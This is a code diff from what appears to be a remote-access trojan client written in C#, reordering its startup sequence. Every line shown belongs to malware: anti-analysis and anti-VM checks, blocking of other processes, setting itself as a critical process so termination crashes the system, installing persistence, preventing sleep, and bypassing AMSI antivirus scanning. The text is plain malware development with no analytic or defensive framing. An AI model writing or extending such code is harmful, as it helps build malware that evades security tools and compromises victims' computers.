@@ -19,17 +19,18 @@ namespace Client
 
             try
             {
-                if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
-                    AntiProcess.StartBlock();
                 if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                     Anti_Analysis.RunAntiAnalysis();
+                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
+                    Environment.Exit(0);
+                if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
+                    AntiProcess.StartBlock();
                 if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
                     ProcessCritical.Set();
                 if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
                     NormalStartup.Install();
                 Methods.PreventSleep(); //prevent pc to idle\sleep
-                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
-                    Environment.Exit(0);
+                
                 if (Methods.IsAdmin())
                     Methods.ClearSetting();
                 Amsi.Bypass();
